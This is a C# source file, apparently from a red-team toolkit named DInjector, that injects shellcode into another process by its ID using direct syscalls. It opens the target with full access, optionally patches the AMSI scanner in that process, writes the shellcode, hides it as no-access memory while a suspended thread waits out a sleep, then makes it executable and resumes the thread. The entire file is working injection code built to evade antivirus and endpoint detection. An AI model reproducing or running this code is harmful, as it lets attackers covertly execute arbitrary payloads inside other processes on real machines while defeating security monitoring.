using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadSuspended
    {
        public static void Execute(byte[] shellcode, int processID, int flipSleep, bool remoteAm51, bool forceAm51, bool debug = false)
        {
            #region NtOpenProcess

            IntPtr hProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtOpenProcess: {ntstatus}");

            if (remoteAm51)
                AM51.Patch(
                    processHandle: hProcess,
                    processID: processID,
                    force: forceAm51);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory, shellcode");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_NOACCESS)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_NOACCESS,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_NOACCESS");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_NOACCESS: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (CREATE_SUSPENDED)

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                true, // CREATE_SUSPENDED
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtCreateThreadEx, CREATE_SUSPENDED");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtCreateThreadEx, CREATE_SUSPENDED: {ntstatus}");

            #endregion

            #region Thread.Sleep

            Console.WriteLine($"(RemoteThreadSuspended) [=] Sleeping for {flipSleep} ms ...");

            System.Threading.Thread.Sleep(flipSleep);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtResumeThread");
            else
                throw new Exception($"(RemoteThreadSuspended) [-] NtResumeThread: {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
